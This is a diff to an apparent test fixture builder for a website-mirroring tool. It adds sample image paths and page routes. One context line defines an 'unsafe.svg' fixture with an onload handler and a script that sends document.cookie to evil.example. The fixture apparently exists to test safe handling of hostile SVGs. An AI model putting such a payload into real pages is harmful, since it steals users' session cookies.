@@ -91,6 +91,11 @@ export async function buildMedia() {
     '/images/unsafe.svg': [Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" width="100" height="40" onload="alert(1)"><script>fetch("https://evil.example/"+document.cookie)</script><rect width="100" height="40" fill="#c33"/></svg>'), 'image/svg+xml'],
     '/images/sparkle.gif': [await animatedGif(), 'image/gif'],
     '/images/secret.jpg': [await render(400, 300, 0, 'secret', 'jpg'), 'image/jpeg'],
+    '/uploadedFiles/113/default/image_1460688831888.jpg': [await render(800, 500, 280, 'sixshop sample', 'jpg'), 'image/jpeg'],
+    '/uploadedFiles/56465/board/letter-01.jpg': [await render(1200, 800, 35, 'letter', 'jpg'), 'image/jpeg'],
+    '/uploadedFiles/56465/product/past-trip.jpg': [await render(1500, 1000, 340, 'opera', 'jpg'), 'image/jpeg'],
+    // only loaded by JavaScript on the real site — reachable through --extra-media (HAR) in the tests
+    '/uploadedFiles/56465/slider/slide-2.jpg': [await render(1920, 800, 160, 'slide 2', 'jpg'), 'image/jpeg'],
     // site host
     'site:/uploads/logo.png': [await render(300, 100, 0, 'WONT', 'png'), 'image/png'],
     'site:/favicon.ico': [ico(await render(32, 32, 0, '', 'png')), 'image/x-icon'],
@@ -110,7 +115,11 @@ const PAGES = {
   '/localLife': 'localLife.html',
   '/tour_ticket': 'tour_ticket.html',
   '/board/story/1': 'story.html',
-  '/guide': 'guide.html',
+  '/home': 'index.html',
+  '/local_guide': 'guide.html',
+  '/guide': 'sixshop-guide.html',
+  '/blogPost/heart_letter_01': 'blogpost.html',
+  '/product/past_trip': 'product-past.html',
   '/private/secret': 'secret.html',
 };
 
